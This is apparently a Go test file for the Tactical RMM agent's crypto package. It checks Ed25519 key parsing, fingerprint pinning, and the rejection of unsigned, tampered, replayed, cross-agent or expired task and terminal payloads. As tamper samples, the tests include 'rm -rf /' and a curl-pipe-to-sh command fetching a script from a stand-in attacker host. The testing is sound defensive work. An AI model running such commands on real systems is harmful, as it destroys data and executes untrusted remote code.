package crypto_test

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"testing"
	"time"

	"tactical-rmm/agent/internal/crypto"
)

func TestParseEd25519PublicKey_Base64AndPEM(t *testing.T) {
	pub, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("failed to generate Ed25519 keypair: %v", err)
	}

	// 1. Parse raw Base64
	b64Str := base64.StdEncoding.EncodeToString(pub)
	parsedB64, err := crypto.ParseEd25519PublicKey(b64Str)
	if err != nil {
		t.Fatalf("ParseEd25519PublicKey failed on Base64 input: %v", err)
	}
	if !parsedB64.Equal(pub) {
		t.Fatalf("parsed Base64 key does not match generated public key")
	}

	// 2. Parse SubjectPublicKeyInfo PEM
	pkixBytes, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		t.Fatalf("failed to marshal PKIX public key: %v", err)
	}
	pemBlock := pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: pkixBytes,
	})
	parsedPEM, err := crypto.ParseEd25519PublicKey(string(pemBlock))
	if err != nil {
		t.Fatalf("ParseEd25519PublicKey failed on PEM input: %v", err)
	}
	if !parsedPEM.Equal(pub) {
		t.Fatalf("parsed PEM key does not match generated public key")
	}

	// 3. Reject empty or malformed keys
	if _, err := crypto.ParseEd25519PublicKey(""); !errors.Is(err, crypto.ErrMissingPublicKey) {
		t.Errorf("expected ErrMissingPublicKey on empty string, got %v", err)
	}
	if _, err := crypto.ParseEd25519PublicKey("dG9vX3Nob3J0"); err == nil {
		t.Errorf("expected error on truncated Base64 public key")
	}

	// 4. Verify public key SHA-256 fingerprint pinning
	fp := crypto.ComputePublicKeyFingerprint(pub)
	if err := crypto.VerifyPublicKeyFingerprint(b64Str, fp); err != nil {
		t.Fatalf("expected fingerprint verification to pass, got: %v", err)
	}
	if err := crypto.VerifyPublicKeyFingerprint(b64Str, "0000000000000000000000000000000000000000000000000000000000000000"); !errors.Is(err, crypto.ErrKeyFingerprintMismatch) {
		t.Errorf("expected ErrKeyFingerprintMismatch on wrong fingerprint, got %v", err)
	}
}

func TestVerifyTaskDispatch_ValidUnsignedAndTampered(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("failed to generate Ed25519 keypair: %v", err)
	}

	taskID := "123e4567-e89b-12d3-a456-426614174000"
	command := "systemctl status sshd"
	timeoutSec := 60

	canonical := crypto.BuildCanonicalTaskPayload(taskID, command, timeoutSec)
	digest := crypto.ComputeTaskDigest(taskID, command, timeoutSec)
	sigBytes := ed25519.Sign(priv, canonical)
	sigB64 := base64.StdEncoding.EncodeToString(sigBytes)

	// 1. Valid signature and matching SHA-256 digest
	if err := crypto.VerifyTaskDispatch(pub, taskID, command, timeoutSec, digest, sigB64); err != nil {
		t.Fatalf("expected valid task dispatch to succeed, got error: %v", err)
	}

	// 2. Unsigned script (empty signature) must be rejected with ErrUnsignedPayload
	if err := crypto.VerifyTaskDispatch(pub, taskID, command, timeoutSec, digest, ""); !errors.Is(err, crypto.ErrUnsignedPayload) {
		t.Errorf("expected ErrUnsignedPayload for unsigned script, got %v", err)
	}

	// 3. Tampered command with original digest must fail with ErrDigestMismatch
	if err := crypto.VerifyTaskDispatch(pub, taskID, "rm -rf /", timeoutSec, digest, sigB64); !errors.Is(err, crypto.ErrDigestMismatch) {
		t.Errorf("expected ErrDigestMismatch for tampered command, got %v", err)
	}

	// 4. Tampered command with recomputed attacker digest must fail with ErrInvalidSignature
	tamperedCmd := "curl http://attacker.invalid/pwn.sh | sh"
	tamperedDigest := crypto.ComputeTaskDigest(taskID, tamperedCmd, timeoutSec)
	if err := crypto.VerifyTaskDispatch(pub, taskID, tamperedCmd, timeoutSec, tamperedDigest, sigB64); !errors.Is(err, crypto.ErrInvalidSignature) {
		t.Errorf("expected ErrInvalidSignature when attacker recomputes SHA-256 digest without private key, got %v", err)
	}

	// 5. Wrong public key must fail with ErrInvalidSignature
	otherPub, _, _ := ed25519.GenerateKey(rand.Reader)
	if err := crypto.VerifyTaskDispatch(otherPub, taskID, command, timeoutSec, digest, sigB64); !errors.Is(err, crypto.ErrInvalidSignature) {
		t.Errorf("expected ErrInvalidSignature with wrong public key, got %v", err)
	}
}

func TestVerifyTaskDispatch_RecipientBindingFreshnessAndReplayProtection(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("failed to generate Ed25519 keypair: %v", err)
	}

	agentA := "11111111-2222-3333-4444-555555555555"
	agentB := "99999999-8888-7777-6666-555555555555"
	taskID := "aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0001"
	cmd := "whoami"
	timeoutSec := 30
	now := time.Now().Unix()
	replayCache := crypto.NewReplayCache(128)

	scope := crypto.TaskScope{
		AgentID:          agentA,
		ExpectedAgentID:  agentA,
		IssuedAt:         now,
		ExpiresAt:        now + 120,
		Nonce:            "0123456789abcdef0123456789abcdef",
		EnforceFreshness: true,
		ReplayCache:      replayCache,
	}

	canonical := crypto.BuildCanonicalTaskPayload(taskID, cmd, timeoutSec, scope)
	digest := crypto.ComputeTaskDigest(taskID, cmd, timeoutSec, scope)
	sigB64 := base64.StdEncoding.EncodeToString(ed25519.Sign(priv, canonical))

	// 1. Valid scoped dispatch succeeds on first execution
	if err := crypto.VerifyTaskDispatch(pub, taskID, cmd, timeoutSec, digest, sigB64, scope); err != nil {
		t.Fatalf("expected valid scoped task dispatch to pass, got: %v", err)
	}

	// 2. Replaying the exact same frame a second time must fail with ErrReplayedPayload
	if err := crypto.VerifyTaskDispatch(pub, taskID, cmd, timeoutSec, digest, sigB64, scope); !errors.Is(err, crypto.ErrReplayedPayload) {
		t.Errorf("expected ErrReplayedPayload on duplicate replay, got: %v", err)
	}

	// 3. Replaying frame signed for Agent A to Agent B must fail with ErrAgentMismatch
	crossAgentScope := scope
	crossAgentScope.ExpectedAgentID = agentB
	crossAgentScope.ReplayCache = crypto.NewReplayCache(128)
	if err := crypto.VerifyTaskDispatch(pub, taskID, cmd, timeoutSec, digest, sigB64, crossAgentScope); !errors.Is(err, crypto.ErrAgentMismatch) {
		t.Errorf("expected ErrAgentMismatch on cross-agent replay, got: %v", err)
	}

	// 4. Expired task frame must fail with ErrExpiredPayload
	expiredScope := crypto.TaskScope{
		AgentID:          agentA,
		ExpectedAgentID:  agentA,
		IssuedAt:         now - 3600,
		ExpiresAt:        now - 1800,
		Nonce:            "fedcba9876543210fedcba9876543210",
		EnforceFreshness: true,
	}
	expCanonical := crypto.BuildCanonicalTaskPayload("aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0009", cmd, timeoutSec, expiredScope)
	expDigest := crypto.ComputeTaskDigest("aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0009", cmd, timeoutSec, expiredScope)
	expSig := base64.StdEncoding.EncodeToString(ed25519.Sign(priv, expCanonical))
	if err := crypto.VerifyTaskDispatch(pub, "aaaaaaaa-bbbb-cccc-dddd-eeeeeeee0009", cmd, timeoutSec, expDigest, expSig, expiredScope); !errors.Is(err, crypto.ErrExpiredPayload) {
		t.Errorf("expected ErrExpiredPayload on expired task, got: %v", err)
	}
}

func TestVerifyTermIn_SignedAndReplayProtected(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("failed to generate Ed25519 keypair: %v", err)
	}

	agentID := "11111111-2222-3333-4444-555555555555"
	now := time.Now().Unix()
	nonce := "aabbccddeeff00112233445566778899"
	payload := "ls -la /etc\n"
	replayCache := crypto.NewReplayCache(128)

	scope := crypto.TaskScope{
		AgentID:          agentID,
		ExpectedAgentID:  agentID,
		IssuedAt:         now,
		ExpiresAt:        now + 120,
		Nonce:            nonce,
		EnforceFreshness: true,
		ReplayCache:      replayCache,
	}

	canonical := crypto.BuildCanonicalTermInPayload(agentID, scope.IssuedAt, scope.ExpiresAt, nonce, payload)
	digest := crypto.ComputeTermInDigest(agentID, scope.IssuedAt, scope.ExpiresAt, nonce, payload)
	sigB64 := base64.StdEncoding.EncodeToString(ed25519.Sign(priv, canonical))

	// 1. Unsigned term_in must be rejected
	if err := crypto.VerifyTermIn(pub, payload, digest, "", scope); !errors.Is(err, crypto.ErrUnsignedPayload) {
		t.Errorf("expected ErrUnsignedPayload for unsigned term_in, got: %v", err)
	}

	// 2. Valid signed term_in succeeds
	if err := crypto.VerifyTermIn(pub, payload, digest, sigB64, scope); err != nil {
		t.Fatalf("expected valid signed term_in to succeed, got: %v", err)
	}

	// 3. Replayed term_in with same nonce must be rejected
	if err := crypto.VerifyTermIn(pub, payload, digest, sigB64, scope); !errors.Is(err, crypto.ErrReplayedPayload) {
		t.Errorf("expected ErrReplayedPayload for replayed term_in nonce, got: %v", err)
	}
}
